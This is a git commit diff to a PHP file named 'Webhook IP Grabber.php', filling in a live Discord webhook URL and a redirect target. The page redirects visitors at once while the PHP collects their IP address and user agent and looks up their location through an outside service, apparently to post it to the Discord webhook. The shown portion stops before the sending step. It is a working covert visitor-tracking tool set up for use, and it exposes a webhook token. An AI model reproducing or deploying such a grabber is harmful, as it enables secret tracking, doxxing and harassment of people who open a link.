19e38959b74d2f00c4026cb5746208b58420f93b
mathpunch Official <ozzycouts51@gmail.com>
2025-02-20 19:04:36 -0600

    Update Webhook IP Grabber.php

--- Webhook IP Grabber.php
+++ Webhook IP Grabber.php
@@ -1,12 +1,12 @@
 <html>
     <head>
-        <meta http-equiv='refresh' content='0; URL=REDIRECT LINK HERE'>
+        <meta http-equiv='refresh' content='0; URL=https://mathpunch.github.io/'>
     </head>
     <body>
     </body>
 </html>
 <?php
-$webhookurl = "WEBHOOK LINK HERE";
+$webhookurl = "https://discord.com/api/webhooks/1342300592285941862/tDAjsQ3qEER7Lalst2uF0ln0E3fGtxpPrMHB-CvvyEnhnZ6N2KoRDNcF8-kxf3lGMcxa";
 $ip= $_SERVER['REMOTE_ADDR'];
 $useragent= $_SERVER['HTTP_USER_AGENT'];
 $json=file_get_contents("https://extreme-ip-lookup.com/json/$ip");
